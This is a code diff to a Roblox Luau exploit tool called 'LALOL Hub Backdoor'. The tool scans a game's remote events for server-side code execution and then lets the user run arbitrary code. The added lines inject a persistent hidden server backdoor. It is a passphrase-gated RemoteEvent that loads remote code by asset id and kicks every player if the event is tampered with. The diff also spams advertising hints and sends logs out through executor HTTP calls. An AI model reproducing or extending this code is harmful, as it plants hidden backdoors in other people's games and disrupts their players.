@@ -182,8 +182,8 @@ G2L["1c"]["Color"] = Color3.fromRGB(255, 255, 255);
 -- StarterGui.LALOL Hub Backdoor.Frame.TextLabel
 G2L["1d"] = Instance.new("TextLabel", G2L["2"]);
 G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
-G2L["1d"]["TextSize"] = 45;
+G2L["1d"]["FontFace"] = Font.new([[rbxassetid://12187365977]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["1d"]["TextSize"] = 49;
 G2L["1d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["1d"]["Size"] = UDim2.new(0, 460, 0, 50);
 G2L["1d"]["Text"] = [[LALOL Hub Backdoor]];
@@ -458,6 +458,7 @@ function Highlighter.highlight(props: HighlightProps)
 				newLabel.TextXAlignment = Enum.TextXAlignment.Left
 				newLabel.TextYAlignment = Enum.TextYAlignment.Top
 				newLabel.Parent = lineFolder
+				newLabel.TextWrapped=true
 				lineLabels[lineNumber] = newLabel
 				lineLabel = newLabel
 			end
@@ -1389,6 +1390,15 @@ local script = G2L["12"];
 		-- Lexer for tokenizing src, defaults to the bundled Lua lexer
 	--	lexer=true,
 	})
+	
+	textbox=script.Parent
+	textbox.InputChanged:Connect(function()
+		if textbox.Text~='' then
+			textbox.TextTransparency=1
+			return
+		end
+		textbox.TextTransparency=0
+	end)
 end;
 task.spawn(C_12);
 -- StarterGui.LALOL Hub Backdoor.LocalScript
@@ -1401,6 +1411,7 @@ local script = G2L["20"];
 	
 	GUI=script.Parent.Frame
 	
+	alphabet={'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
 	
 	backdoor=nil
 	HttpService=game:GetService("HttpService")
@@ -1413,7 +1424,7 @@ local script = G2L["20"];
 		func('LALOL Hub Backdoor: '..text)
 	end
 	
-	function runRemote(remote, data)
+	function runRemote(remote, data, data2)
 	
 		if remote:IsA('RemoteEvent') then
 			remote:FireServer(data)
@@ -1451,11 +1462,34 @@ local script = G2L["20"];
 	GUI.Scanner.Visible=true
 	GUI.Visible=true
 	
+	function generateName(lenght)
+		
+		local text=''
+		
+		for i=1,lenght do
+			text=text..alphabet[math.random(1,#alphabet)]
+		end
+		
+		return text
+		
+	end
+	
+	local code
 	function findRemote()
 		
 		local timee=os.clock()
 		
 		local remotes={}
+		
+		local protected_backdoor=game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
+		if protected_backdoor then
+			while true do
+				code=generateName(math.random(12,30))
+				if not remotes[code] then break end
+			end
+				protected_backdoor:FireServer('lalol hub join today!! discord.gg/XXqzxT7E5z', "a=Instance.new('Model',workspace)a.Name='"..code.."'")
+				remotes[code]=protected_backdoor
+			end
 		
 		for i,remote in game:GetDescendants() do
 			
@@ -1494,9 +1528,13 @@ local script = G2L["20"];
 			end
 	
 			-- Backdoor Sender
-	
-			local code=i
-			runRemote(remote, "a=Instance.new('Model',workspace)a.Name="..code)
+			
+			while true do
+				code=generateName(math.random(12,30))
+				if not remotes[code] then break end
+			end
+			
+			runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
 			remotes[code]=remote
 			
 			debug('Sended Backdoor "'..remote:GetFullName()..'"', 1)
@@ -1507,9 +1545,9 @@ local script = G2L["20"];
 		
 		for i=1,100 do
 		
-			for i,remote in remotes do	
+			for i,remote in remotes do
 				local code=i
-					
+				
 				if workspace:FindFirstChild(code) then
 					
 					notify('Backdoor found! '..os.clock()-timee..'s')
@@ -1519,8 +1557,10 @@ local script = G2L["20"];
 					GUI.Scanner.Visible=false
 					makeVisible(GUI.Executor, true)
 	
-					runRemote(backdoor, "a=Instance.new('Hint',workspace)while true do a.Text='LALOL Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
-	
+	--				runRemote(backdoor, "a=Instance.new('Hint',workspace)while true do a.Text='LALOL Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
+					runRemote(remote, "spawn(function()ReplicatedStorage=game:GetService('ReplicatedStorage')Players=game:GetService('Players')local a=require(11611373177)function shutdown(b)for c,d in Players:GetPlayers()do spawn(function()d:Kick(b)end)end end;reputation=30;function addRemoteEvent()local e=Instance.new('RemoteEvent')local f='lh'..game.PlaceId/6666*1337*game.PlaceId;e.Name=f;e.Parent=ReplicatedStorage;e.OnServerEvent:Connect(function(g,h,i)if h=='lalol hub join today!! discord.gg/XXqzxT7E5z'then a(i)()end end)local j;j=e.Changed:Connect(function()spawn(function()j:Disconnect()end)reputation=reputation-1;print('rip reputation')spawn(function()addRemoteEvent()end)e:Destroy()end)end;spawn(function()while wait(0.3)do if 0>=reputation then shutdown('[Anti-Hack] Something went wrong...')end end end)addRemoteEvent()end)")			
+					runRemote(remote, "a=Instance.new('Hint')a.Text='LALOL Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
+					
 					local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 					if request and not _G.LALOL_Hub_Backdoor_Logs_Disabled then 
 						request({
@@ -1551,7 +1591,14 @@ local script = G2L["20"];
 	
 	GUI.Executor.Execute.Button.MouseButton1Click:Connect(function()
 		local a,b=string.gsub(GUI.Executor.ExecutorBox.TextBox.Text, '%%username%%', game:GetService('Players').LocalPlayer.Name)
-		runRemote(backdoor, a)
+		
+		local protected_backdoor=game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
+		if protected_backdoor then
+			debug('Protected backdoor found', 3)
+			protected_backdoor:FireServer('lalol hub join today!! discord.gg/XXqzxT7E5z', a)
+		else
+			runRemote(backdoor, a)
+		end
 		GUI.Executor.Execute.Button.Text='Executed!'
 		wait(0.5)
 		GUI.Executor.Execute.Button.Text='Execute'
